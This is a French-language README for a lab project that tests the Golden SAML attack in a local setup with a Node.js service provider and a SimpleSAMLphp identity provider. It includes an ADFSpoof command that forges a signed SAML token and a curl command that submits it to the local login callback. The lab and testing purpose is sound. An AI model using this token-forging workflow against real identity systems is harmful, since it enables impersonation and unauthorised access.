## README

Ce projet a pour but de tester l'attaque Golden SAML en mettant en place un environnement très basique constitué d'un identity provider et d'un service provider:

* https://www.xmco.fr/actu-secu/XMCO-ActuSecu-56-SolarWinds-CallStranger-GitLab.pdf

## Usage

### Service Provider
```bash
cd npm; node index
```
go to  http://localhost:4300/login

### Identity Provider
```bash
cd docker-simplesamlphp; docker-compose up
```
go to http://localhost/

### ADFSpoof
Pour générer un jeton SAML signé:
```bash
python3 ADFSpoof.py -s "test" -c server.p12 -o SAMLResponse.txt -p "poc" saml2 --nameidformat "" --nameid "" --endpoint "" --rpidentifier "" --assertions ""
```

Le jeton généré a été exporté au sein du fichier **SAMLResponse.txt**.
Transmettre la réponse SAML générée, en base64 (`base64 SAMLResponse.txt`), à l'aide par exemple de la commande ci-dessous:

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: sp:4300' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 4355' \
    --data-urlencode $'SAMLResponse=<SAMLResponse.txt encodé en base64>' \
    $'http://localhost:4300/login/callback'
```

## Références
- https://medium.com/disney-streaming/setup-a-single-sign-on-saml-test-environment-with-docker-and-nodejs-c53fc1a984c9
- https://github.com/kenchan0130/docker-simplesamlphp
- https://github.com/fireeye/ADFSpoof

